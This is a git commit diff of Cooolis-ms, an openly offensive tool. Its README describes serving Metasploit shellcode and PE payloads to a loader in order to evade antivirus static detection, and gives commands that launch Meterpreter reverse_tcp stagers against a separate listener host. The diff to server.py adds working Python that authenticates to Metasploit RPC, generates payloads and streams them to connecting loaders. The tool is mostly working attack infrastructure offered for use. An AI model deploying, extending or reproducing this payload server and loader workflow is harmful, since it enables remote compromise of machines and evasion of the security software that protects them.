b875b9b3976f3bc5e6600fc0eb65adcfd955ce81
Rvn0xsy <payloads@aliyun.com>
2019-04-01 13:55:40 +0800

    version 1.1

--- README.md
+++ README.md
@@ -1,1 +1,107 @@
 # Cooolis-ms
+
+Cooolis-ms 是一个支持Metasploit Framework RPC的一个服务端，用于给Shellcode和PE加载器工作，在一定程度上绕过反病毒软件的静态查杀，同时可以让Cooolis-ms服务端与Metasploit服务器进行分离。
+
+
+Cooolis-ms is a server that supports the Metasploit Framework RPC. It is used to work with the Shellcode and PE loader. To some extent, it bypasses the static killing of anti-virus software, and allows the Cooolis-ms server to communicate with the Metasploit server. Separation.
+
+
+[![Cooolis](http://img.youtube.com/vi/xMYZbvn53aY/0.jpg)](https://www.youtube.com/embed/xMYZbvn53aY "Cooolis")
+
+## How to install | 如何安装
+
+```
+$ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
+$ cd Cooolis-ms
+$ pip3 install -r requirements.txt
+$ python3 server.py -h
+```
+
+## How to use |  如何使用
+
+你需要先启动Metasploit RPC服务端：
+
+You need to start the Metasploit RPC server first:
+
+IP : 172.16.143.1
+
+```
+$ msfrpcd -U msf -P msf -u /api/1.0/
+```
+
+接着需要启动Cooolis-ms，使得它连接到RPC，并且监听一个端口，用来发送载荷：
+
+Then you need to start Cooolis-ms so that it connects to the RPC and listens on a port to send the payload:
+
+IP : 172.16.143.1
+
+```
+$ python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 8899 -S 172.16.143.1
+```
+
+IP : 172.16.143.2
+
+```
+Windows > ConsoleApplication5.exe -p windows/meterpreter/reverse_tcp -s LHOST=172.16.143.1,LPORT=8876,Format=dll -H 172.16.143.1 -P 8899 -c password
+```
+
+## Cooolis-ms server
+
+```
+usage: Cooolis-ms [-h] -U USERNAME -P PASSWORD [-H HOST] [-p PORT] [-S SERVER]
+                  [-l LISTEN] [-u URI] [-t {exe,ruby,c,dll,vbs,powershell}]
+                  [-s] [-v]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -U USERNAME, --username USERNAME
+                        Metasploit web service username
+  -P PASSWORD, --password PASSWORD
+                        Metasploit web service password
+  -H HOST, --host HOST  Metasploit web service host, Default: localhost
+  -p PORT, --port PORT  Metasploit RPC service port, Default: 55553
+  -S SERVER, --server SERVER
+                        Payload sender listen host, Default: localhost
+  -l LISTEN, --listen LISTEN
+                        Payload listen port, Default: 1111
+  -u URI, --uri URI     Metasploit RPC service uri, Default: /api/1.0/
+  -t {exe,ruby,c,dll,vbs,powershell}, --type {exe,ruby,c,dll,vbs,powershell}
+                        Payload Type
+  -s, --ssl             Enable ssl, Default: True
+  -v, --versobe         Enable debug
+```
+
+## Cooolis-ms Loader
+
+
+![](./pic/demo.png)
+
+```
+[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -c [RC4 PASSWORD] -H [Stager Host] -P [Stager Port]
+         -p [PAYLOAD]    MSF PAYLOAD TYPE
+         -s [PAYLOAD OPTIONS]    MSF PAYLOAD OPTIONS
+         -c [RC4 PASSWORD]       Startup RC4 Trans Stager
+         -H [Stager Host]        Cooolis-Server Host
+         -P [Stager Port]        Cooolis-Server Port
+         -D [Default]
+[*]Example : Cooolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.1.1,LPORT=1122 -H 192.168.2.1 -P 4444
+```
+
+## About other | 关于其他
+
+~~后续我将会写出Windows平台下的通用加载器客户端集合到这个项目中。~~
+
+
+~~Subsequent I will write a collection of generic loader clients for the Windows platform into this project.~~
+
+如果你觉得这个项目不错，那就给一个Star～
+
+If you think this project is good, give a Star.
+
+## issue
+
+[I have a question](https://github.com/Rvn0xsy/Cooolis-ms/issues)
+
+## LICENSE
+
+[GNU General Public License v3.0](https://github.com/Rvn0xsy/Cooolis-ms/blob/master/LICENSE)
--- server.py
+++ server.py
@@ -1,31 +1,34 @@
+"""
+Cooolis-ms
+------------
+Author:Rvn0xsy@gmail.com
+根据Metasploit Framework RPC 实现远程生成PAYLOAD，主要用于给灵活的PE加载器、Shellcode工作
+Github:https://github.com/Rvn0xsy/Cooolis-ms/
+"""
 import requests
 from argparse import ArgumentParser
 import msgpack
 import ssl
 import sys
+import json
+import term
+import struct
 from socketserver import BaseRequestHandler,ThreadingTCPServer
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 ssl._create_default_https_context = ssl._create_unverified_context
 
-class Cooolis_Server(BaseRequestHandler):
-    def handle(self):
-        print("Connected from: ", self.client_address)
-        while True:
-            recvData = self.request.recv(1024)
-            if not recvData:
-                break
-            self.request.sendall(recvData)
-        self.request.close()
-        print("Disconnected from: ", self.client_address)
 
-class Metasploit_RPC():
-    def __init__(self,args,**kwargs):
+class Metasploit_RPC(BaseRequestHandler):
+    def __init__(self, request, client_address, server, args):
         self.type = args.type
         self.username = args.username
         self.password = args.password
         self.listen = args.listen
         self.host = args.host
         self.port = args.port
+        self.server = args.server
         self.uri = args.uri
         self.debug = args.versobe
         self.token = ''
@@ -36,46 +39,98 @@ class Metasploit_RPC():
         else:
             prefix = 'http://'
         self.url = "{prefix}{host}:{port}{uri}".format(prefix=prefix,host=self.host,port=self.port,uri=self.uri)
-        
-    def start(self):
-        srv = ThreadingTCPServer(("",self.listen),self)
-        srv.serve_forever()
+        super().__init__(request, client_address, server)
 
-    def _get_token(self):
-        options = ["auth.login",self.username,self.password]
-        options = self.__pack(options)
+    @classmethod
+    def Creator(cls, *args, **kwargs):
+        def _HandlerCreator(request, client_address, server):
+            cls(request, client_address, server, *args, **kwargs)
+        return _HandlerCreator
+
+
+    def _request(self,options):
         try:
+            term.writeLine("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]), term.green)
+            options = self.__pack(options)
             req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
             result = self.__unpack(req.content)
             if b'error' in result:
                 print("Error : %s" % str(result[b'error_message']),encoding = "utf8")
             else:
-                self.token = str(result[b'token'],encoding = "utf8")
+                return result
         except Exception as e:
             sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")
+    
 
+    def _get_token(self):
+        options = ["auth.login",self.username,self.password]
+        
+        result = self._request(options)
+        self.token = str(result[b'token'],encoding = "utf8")
+        term.writeLine("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password),term.green)
+    
+    # 打包数据
     def __pack(self,pack_str):
         return msgpack.packb(pack_str)
-
+    
+    # 解包数据
     def __unpack(self,pack_str):
         return msgpack.unpackb(pack_str)
 
+    def __send_payload(self,payload,options):
+        term.writeLine("[*]PAYLOAD: {payload}".format(payload=payload),term.green)
+        pack_data = ["module.execute",self.token,"payload",payload,options]
+        return self._request(pack_data)
+
+    def handle(self):
+        term.writeLine("[*]New connection: {client}".format(client=self.client_address),term.green)
+        self._get_token()
+        while True:
+            data = self.request.recv(1024)
+            if not data:break
+            try:
+                data = struct.unpack(">200s200s200sLHH",data)
+                # print(data)
+                options = {}
+                str_json = data[1].decode('UTF-8')
+                str_json = str_json.strip('\x00')
+                # print("Options : %s size : %d",str_json,len(str_json))
+                for x in str_json.split(','):
+                    k,v = x.split('=',2)
+                    # print(k,":",v)
+                    options.update({k.strip():v.strip()})
+                payload = data[0].decode('UTF-8')
+                payload = payload.strip('\x00')
+                # print("Payload : %s Options : %s " % (payload,options['LHOST']))
+                recv_payload = self.__send_payload(payload,options)
+                # print("Send ..  %s ",recv_payload)
+                payload_size = len(recv_payload[b'payload'])
+                self.request.send(payload_size.to_bytes(4,byteorder='little',signed=False))
+                self.request.send(recv_payload[b'payload'])
+                self.request.close()
+            except Exception as e:
+                term.writeLine("[!]{error}".format(error=str(e)),term.red)
+                pass
+            finally:
+                break
 
 def main():
-    example = 'Example:\n\n$ python3 server.py -U msf -P msf'
+    example = 'Example:\n\n$ python3 server.py -U msf -P msf -v -s -l 4444'
     args = ArgumentParser(prog='Cooolis-ms',epilog=example)
     args.add_argument('-U','--username',help='Metasploit web service username',required=True)
     args.add_argument('-P','--password',help='Metasploit web service password',required=True)
-    args.add_argument('-H','--host',help='Metasploit web service host',default='localhost')
-    args.add_argument('-p','--port',help='Metasploit RPC service port',default=55553)
-    args.add_argument('-l','--listen',help='Payload listen port',default=8080)
-    args.add_argument('-u','--uri',help='Metasploit RPC service uri',default='/api/1.0/')
+    args.add_argument('-H','--host',help='Metasploit web service host, Default: localhost',default='localhost')
+    args.add_argument('-p','--port',help='Metasploit RPC service port, Default: 55553',default=55553,type=int)
+    args.add_argument('-S','--server',help='Payload sender listen host, Default: localhost',default='localhost')
+    args.add_argument('-l','--listen',help='Payload listen port, Default: 1111',default=1111,type=int)
+    args.add_argument('-u','--uri',help='Metasploit RPC service uri, Default: /api/1.0/',default='/api/1.0/')
     args.add_argument('-t','--type',help='Payload Type',choices=('exe','ruby','c','dll','vbs','powershell'))
-    args.add_argument('-s','--ssl',help='Enable ssl',action="store_true")
+    args.add_argument('-s','--ssl',help='Enable ssl, Default: True',action="store_true",default=True)
     args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
     parser = args.parse_args()
-    msf = Metasploit_RPC(parser)
-    msf.start()
+    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen), term.green)
+    server = ThreadingTCPServer((parser.server,parser.listen),Metasploit_RPC.Creator(parser))
+    server.serve_forever()
     
 if __name__ == "__main__":
     main()
